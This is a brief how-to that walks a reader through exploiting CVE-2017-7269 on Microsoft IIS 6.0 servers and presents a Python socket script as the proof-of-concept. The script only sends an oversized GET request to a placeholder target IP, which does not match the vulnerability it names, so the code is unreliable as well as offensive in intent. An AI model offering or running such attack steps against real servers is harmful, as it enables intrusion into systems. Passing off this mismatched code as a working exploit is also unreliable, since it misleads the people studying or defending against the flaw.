## Manual Proof-of-Concept Exploit

To manually exploit CVE-2017-7269, follow these steps:

1. **Identify the Target**:
   - Confirm that the target is running Microsoft IIS 6.0 and is vulnerable to CVE-2017-7269.

2. **Prepare the Exploit Code**:
   - Download or write the PoC exploit code for CVE-2017-7269. A common PoC can be found on exploit databases or security forums.

3. **Execute the Exploit**:
   - Transfer the exploit code to a system where you have command execution rights.
   - Modify the exploit code to target the specific IP address of the IIS server.

   ```python
   # Example Python code for CVE-2017-7269 PoC
   import socket

   target = 'TARGET_IP'
   port = 80

   buffer = "GET /" + "A" * 1024 + " HTTP/1.1\r\nHost: " + target + "\r\n\r\n"

   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((target, port))
   s.send(buffer.encode())
   s.close()
